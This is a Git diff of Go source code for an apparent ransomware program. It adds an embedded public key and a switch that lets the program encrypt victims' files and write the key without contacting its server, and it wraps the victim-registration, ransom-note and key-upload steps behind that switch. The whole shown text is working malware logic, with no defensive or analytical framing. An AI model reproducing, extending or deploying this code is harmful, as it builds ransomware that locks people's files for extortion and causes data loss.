@@ -30,6 +30,14 @@ Your unique ID is: %s
 const serverPath = "http://localhost:8080"
 const encryptionScheme crypt.EncryptionScheme = crypt.AES256
 
+// useServer disables the usage of server-sided features like keeping track of victims or
+// giving out the public key. Thus the client needs to use a decrypting program which has
+// a valid key supplied.
+const useServer = false
+
+//go:embed public-key.pem
+var publicKey []byte
+
 func handleDecryptionProcess(rw *ransomware.Ransomware) {
 	if rw.CheckIfValidMemSafeKey() {
 		fmt.Println("found a valid key.")
@@ -73,18 +81,29 @@ func main() {
 		log.Fatalf("error while encrypting files, err: %s", err)
 	}
 
-	if err := rw.WriteMemSafeKey(); err != nil {
-		log.Fatal(err)
+	if useServer {
+		if err := rw.WriteMemSafeKey(); err != nil {
+			log.Fatal(err)
+		}
+	} else {
+		if err := rw.WriteKeyWithFile(publicKey); err != nil {
+			log.Fatal(err)
+		}
 	}
 
+	// we can't really keep track of the amount of victims without a server so don't do anything
+	if useServer {
+		rw.Data.SendToServer(config.GetConfig().ServerPath + "/register")
+		if err := rw.CreateRansomInfoFile(message); err != nil {
+			log.Fatal(err)
+		}
+	}
 	rw.Data.GetPublicIP()
-	rw.Data.SendToServer(config.GetConfig().ServerPath + "/register")
-	if err := rw.CreateRansomInfoFile(message); err != nil {
-		log.Fatal(err)
-	}
 
-	if err := rw.SendKeyToServer(); err != nil {
-		log.Fatal(err)
+	if useServer {
+		if err := rw.SendKeyToServer(); err != nil {
+			log.Fatal(err)
+		}
 	}
 
 	// Start an infnite loop which checks key validity. We start in a goroutine, since
